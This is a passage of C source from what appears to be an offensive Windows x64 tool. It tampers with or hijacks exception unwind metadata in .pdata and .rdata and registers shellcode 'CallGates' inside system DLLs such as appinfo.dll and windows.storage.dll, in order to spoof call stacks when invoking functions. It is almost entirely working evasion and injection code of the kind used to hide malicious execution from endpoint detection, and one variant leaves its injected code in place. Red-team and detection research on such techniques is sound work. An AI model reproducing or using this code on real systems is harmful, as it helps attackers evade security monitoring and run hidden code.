    if (stackSpace == 0) {
        printf("Failed to calculate stack space\n");
        return (UINT64)-1;
    }
    if (stackPointer == 0) {
        printf("Failed to detect BaseThreadInitThunk on Stack\n");
        return (UINT64)-1;
    }

    functionPointer = GetProcAddress(hModule, lpFunctionName);
    if (functionPointer == NULL) {
        printf("Failed to find %s function address: %08x\n", lpFunctionName, GetLastError());
        return (UINT64)-1;
    }
    functionOffset = (DWORD)((UINT64)textSectionInfo.Address - (UINT64)hModule);

    printf("Function `%s` address: 0x%llx\n", lpFunctionName, (ULONGLONG)functionPointer);
    printf("Offset from module start to %s: %08x\n", lpFunctionName, functionOffset);

    runtimeFunction = RTFindFunctionByAddress(
        (UINT64)hModule, (DWORD)((DWORD64)functionPointer - (DWORD64)hModule));
    if (runtimeFunction == NULL) {
        printf("Failed to find runtime function for %s\n", lpFunctionName);
        return (UINT64)-1;
    }
    printf("Runtime Function for %s: %p\n", lpFunctionName, runtimeFunction);

    pRuntimeFunctionTable = (PRUNTIME_FUNCTION)GetExceptionDirectoryAddress(
        (HMODULE)hModule, &tSize);

    pInfo = (PUNWIND_INFO)((UINT64)hModule + (UINT64)runtimeFunction->UnwindInfoAddress);
    printf("Unwind Info for %s: %p\n", lpFunctionName, pInfo);

    unwSide = SizeOfUnwind(pInfo);
    hexdump(pInfo, unwSide);

    rspHere = GetCurrentRsp();
    printf("BTIT on stack: 0x%llx\n", stackPointer + 8);
    printf("Curent RSP: 0x%llx\n", rspHere);
    printf("Current RSP - BTIT: 0x%llx\n", stackPointer - rspHere);
    printf("Calculated StackSpace: 0x%llx\n", stackSpace);

    stackSpace = stackPointer - rspHere + 8;
    printf("Calculated Stack Distance from BTIT: 0x%llx\n", stackSpace);

    /* ----------------------------------------------------------------
     * UNWIND_DATA_HIJACK
     * ---------------------------------------------------------------- */
    if (technique == UNWIND_DATA_HIJACK) {
        DWORD   _ignore = 0;
        DWORD64 targetFunctionFrameSize;
        DWORD   dwHijackableRuntimeFunctionSize;
        PRUNTIME_FUNCTION_BACKUP prtfBackup = NULL;
        BYOUD_CHANGE c;

        ByoudContextInit(&ctx, technique, hModule);

        if (!UnprotectPdata(hModule)) {
            printf("Failed to unprotect .pdata section\n");
            return (UINT64)-1;
        }

        targetFunctionFrameSize = (DWORD64)GetStackFrameSize(hModule, pInfo, &_ignore);

        if (!HijackUnwindInfoAddress(hModule, runtimeFunction,
            (DWORD)(stackSpace + targetFunctionFrameSize), FALSE,
            &dwHijackableRuntimeFunctionSize, &prtfBackup)) {
            printf("Failed to hijack Unwind Info address\n");
            ProtectPdata(hModule);
            return (UINT64)-1;
        }

        if (prtfBackup) {
            memset(&c, 0, sizeof(c));
            c.Type = BCT_RUNTIME_FUNCTION;
            c.u.RuntimeFunction.hModule = hModule;
            c.u.RuntimeFunction.pOriginalLocation = prtfBackup->pOriginalLocation;
            c.u.RuntimeFunction.OldValue = prtfBackup->Data;
            ByoudPushChange(&ctx, &c);
            FreeRuntimeFunctionBackup(prtfBackup);
        }

        if (!ProtectPdata(hModule)) {
            printf("Failed to protect .pdata section\n");
            goto done;
        }

        DBG(printf("dwHijackableRuntimeFunctionSize: 0x%x\n", dwHijackableRuntimeFunctionSize));
        DBG(printf("targetFunctionFrameSize: 0x%llx\n", targetFunctionFrameSize));
        DBG(printf("stackSpace: 0x%llx\n", stackSpace));

        rax = RailGun(functionPointer, dwArgc, pqwArgv, dwHijackableRuntimeFunctionSize);
        goto done;
    }

    /* ----------------------------------------------------------------
     * UNWIND_DATA_TAMPER
     * ---------------------------------------------------------------- */
    else if (technique == UNWIND_DATA_TAMPER) {
        PVOID pBackup;
        DWORD unwindSize = SizeOfUnwind(pInfo);

        ByoudContextInit(&ctx, technique, hModule);

        pBackup = malloc(unwindSize);
        if (!pBackup) return (UINT64)-1;
        memcpy(pBackup, pInfo, unwindSize);
        ByoudTrackUnwindInfo(&ctx, pInfo, pBackup, unwindSize);

        puwBackup = SaveUnwind(pInfo);

        if (!UnprotectRdata(hModule)) {
            printf("Failed to unprotect .rdata section\n");
            goto done;
        }

        if (!TamperUnwind(pInfo, (DWORD)stackSpace + 0x58, &oldFrameSize)) {
            printf("Failed to change unwind info\n");
            ProtectRdata(hModule);
            goto done;
        }

        if (!ProtectRdata(hModule)) {
            printf("Failed to protect .rdata section\n");
            goto done;
        }

        hexdump(pInfo, unwSide);
        PrintUnwindInfo(hModule,
            (PVOID)((UINT64)runtimeFunction->UnwindInfoAddress), -1, TRUE);

        rax = RailGun(functionPointer, dwArgc, pqwArgv, 0x58);
        goto done;
    }

    /* ----------------------------------------------------------------
     * RT_FUNCTION_HIJACK
     * ---------------------------------------------------------------- */
    else if (technique == RT_FUNCTION_HIJACK) {
        DWORD   actualSize = 0;
        HMODULE hTarget;
        PCALLGATE_PARAMS params;
        CallGateFn pCallGate;
        char dllName[] = "appinfo.dll";

        hTarget = LoadLibraryA(dllName);
        if (NULL == hTarget) return (UINT64)-1;

        ByoudContextInit(&ctx, technique, hTarget);

        printf("[*] Registering CallGate in %s via RT_FUNCTION_HIJACK, size %llx\n",
            dllName, stackSpace);

        if (!RegisterShellcode(&ctx, dllName, (DWORD)stackSpace + 8,
            &actualSize, RT_FUNCTION_HIJACK, &copyInfo)) {
            printf("Failed to register shellcode\n");
            goto done;
        }

        printf("[+] CallGate source: 0x%p (size: 0x%x)\n",
            copyInfo.pSourceAddress, copyInfo.dwSize);
        printf("[+] CallGate copied to: 0x%p\n", copyInfo.pCopiedAddress);
        printf("[+] Hijacked unwind size: 0x%x\n", actualSize);

        if (actualSize > 0) actualSize -= 6 * 8;

        params = BuildCallGateParamsFromArray(
            functionPointer, actualSize, dwArgc, pqwArgv);
        if (params == NULL) { printf("Failed to allocate params\n"); goto done; }

        TestUnwindRegistration((ULONG64)copyInfo.pCopiedAddress, (ULONG64)hTarget,
            (DWORD)stackSpace + 8 + actualSize + (6 * 8));

        pCallGate = (CallGateFn)copyInfo.pCopiedAddress;
        if (NULL != pCallGate) pCallGate(params);

        free(params);
        ZeroMemory(copyInfo.pCopiedAddress, copyInfo.dwSize);
        goto done;
    }

    /* ----------------------------------------------------------------
     * RT_FUNCTION_INJECT  (no restore — injected code persists)
     * ---------------------------------------------------------------- */
    else if (technique == RT_FUNCTION_INJECT) {
        DWORD   actualSize = 0;
        HMODULE hTarget;
        PCALLGATE_PARAMS params;
        CallGateFn pCallGate;
        char dllName[] = "appinfo.dll";

        hTarget = LoadLibraryA(dllName);
        if (NULL == hTarget) return (UINT64)-1;

        printf("[*] Registering CallGate in %s via RT_FUNCTION_INJECT, size %llx\n",
            dllName, stackSpace);

        if (!RegisterShellcode(NULL, dllName, (DWORD)stackSpace + 8,
            &actualSize, RT_FUNCTION_INJECT, &copyInfo)) {
            printf("Failed to register shellcode\n");
            return (UINT64)-1;
        }

        printf("[+] CallGate source: 0x%p (size: 0x%x)\n",
            copyInfo.pSourceAddress, copyInfo.dwSize);
        printf("[+] CallGate copied to: 0x%p\n", copyInfo.pCopiedAddress);
        printf("[+] Injected with unwind size: 0x%x\n", (DWORD)stackSpace);

        if (actualSize > 0) actualSize -= 6 * 8;

        params = BuildCallGateParamsFromArray(
            functionPointer, actualSize, dwArgc, pqwArgv);
        if (params == NULL) { printf("Failed to allocate params\n"); return (UINT64)-1; }

        pCallGate = (CallGateFn)copyInfo.pCopiedAddress;
        if (NULL != pCallGate) {
            TestUnwindRegistration((ULONG64)copyInfo.pCopiedAddress, (ULONG64)hTarget,
                (DWORD)stackSpace + 8 + actualSize + (6 * 8));
            pCallGate(params);
        }

        free(params);
        /* Note: RT_FUNCTION_INJECT adds new entries, no restore needed */
        return rax;
    }

    /* ----------------------------------------------------------------
     * RTFI_JIT_SYSINFORMER
     * ---------------------------------------------------------------- */
    else if (technique == RTFI_JIT_SYSINFORMER) {
        DWORD   actualSize = 0;
        HMODULE hTarget;
        PCALLGATE_PARAMS params;
        CallGateFn pCallGate;
        char dllName[] = "windows.storage.dll";

        hTarget = LoadLibraryA(dllName);
        if (NULL == hTarget) return (UINT64)-1;

        ByoudContextInit(&ctx, technique, hTarget);

        printf("[*] Registering CallGate in %s via RTFI_JIT_SYSINFORMER, size %llx\n",
            dllName, stackSpace);

        if (!RegisterShellcode(&ctx, dllName, (DWORD)stackSpace + 8,
            &actualSize, RTFI_JIT_SYSINFORMER, &copyInfo)) {
            printf("Failed to register shellcode\n");
            goto done;
        }

        printf("[+] CallGate source: 0x%p (size: 0x%x)\n",
            copyInfo.pSourceAddress, copyInfo.dwSize);
        printf("[+] CallGate copied to: 0x%p\n", copyInfo.pCopiedAddress);
        printf("[+] Injected with unwind size: 0x%x\n", (DWORD)stackSpace);

        if (actualSize > 0) actualSize -= 6 * 8;

        params = BuildCallGateParamsFromArray(
            functionPointer, actualSize, dwArgc, pqwArgv);
        if (params == NULL) { printf("Failed to allocate params\n"); goto done; }

        pCallGate = (CallGateFn)copyInfo.pCopiedAddress;
        if (NULL != pCallGate) {
            TestUnwindRegistration((ULONG64)copyInfo.pCopiedAddress, (ULONG64)hTarget,
                (DWORD)stackSpace + 8 + actualSize + (6 * 8));
            pCallGate(params);
        }

        free(params);
		if (NULL != copyInfo.pCopiedAddress) ZeroMemory(copyInfo.pCopiedAddress, copyInfo.dwSize);
        goto done;
    }

    /* ----------------------------------------------------------------
     * RTFI_JIT_WINDBG
     * ---------------------------------------------------------------- */
    else if (technique == RTFI_JIT_WINDBG) {
        DWORD   actualSize = 0;
        HMODULE hTarget;
        PCALLGATE_PARAMS params;
        CallGateFn pCallGate;
        char dllName[] = "windows.storage.dll";

        hTarget = LoadLibraryA(dllName);
        if (NULL == hTarget) return (UINT64)-1;

        ByoudContextInit(&ctx, technique, hTarget);

        printf("[*] Registering CallGate in %s via RTFI_JIT_WINDBG, size %llx\n",
            dllName, stackSpace);

        if (!RegisterShellcode(&ctx, dllName, (DWORD)stackSpace + 8,
            &actualSize, RTFI_JIT_WINDBG, &copyInfo)) {
            printf("Failed to register shellcode\n");
            goto done;
        }

        printf("[+] CallGate source: 0x%p (size: 0x%x)\n",
            copyInfo.pSourceAddress, copyInfo.dwSize);
        printf("[+] CallGate copied to: 0x%p\n", copyInfo.pCopiedAddress);
        printf("[+] Injected with unwind size: 0x%x\n", (DWORD)stackSpace);

        if (actualSize > 0) actualSize -= 6 * 8;

        params = BuildCallGateParamsFromArray(
            functionPointer, actualSize, dwArgc, pqwArgv);
        if (params == NULL) { printf("Failed to allocate params\n"); goto done; }

        pCallGate = (CallGateFn)copyInfo.pCopiedAddress;
        if (NULL != pCallGate) {
            TestUnwindRegistration((ULONG64)copyInfo.pCopiedAddress, (ULONG64)hTarget,
                (DWORD)stackSpace + 8 + actualSize + (6 * 8));
            pCallGate(params);
        }

        free(params);
        goto done;
    }

    /* ----------------------------------------------------------------
     * RTFI_JIT_NORMAL_VA
     * ---------------------------------------------------------------- */
    else if (technique == RTFI_JIT_NORMAL_VA) {
        DWORD   actualSize = 0;
        HMODULE hTarget;
        PCALLGATE_PARAMS params;
        CallGateFn pCallGate;
        char dllName[] = "appinfo.dll";

        ByoudContextInit(&ctx, technique, NULL);

        printf("[*] Registering CallGate in %s via RTFI_JIT_NORMAL_VA, size %llx\n",
            dllName, stackSpace);

        if (!RegisterShellcode(&ctx, dllName, (DWORD)stackSpace + 8,
            &actualSize, RTFI_JIT_NORMAL_VA, &copyInfo)) {
            printf("Failed to register shellcode\n");
            goto done;
        }

        hTarget = ctx.hTargetModule;

        printf("[+] CallGate source: 0x%p (size: 0x%x)\n",
            copyInfo.pSourceAddress, copyInfo.dwSize);
        printf("[+] CallGate copied to: 0x%p\n", copyInfo.pCopiedAddress);
        printf("[+] Injected with unwind size: 0x%x\n", (DWORD)stackSpace);

        if (actualSize > 0) actualSize -= 6 * 8;

        params = BuildCallGateParamsFromArray(
            functionPointer, actualSize, dwArgc, pqwArgv);
        if (params == NULL) { printf("Failed to allocate params\n"); goto done; }

        pCallGate = (CallGateFn)copyInfo.pCopiedAddress;
        if (NULL != pCallGate) pCallGate(params);

        free(params);
        goto done;
    }

    else {
        printf("Unknown technique!\n");
        return (UINT64)-1;
    }

done:
    ByoudRestoreAll(&ctx);
    return rax;
}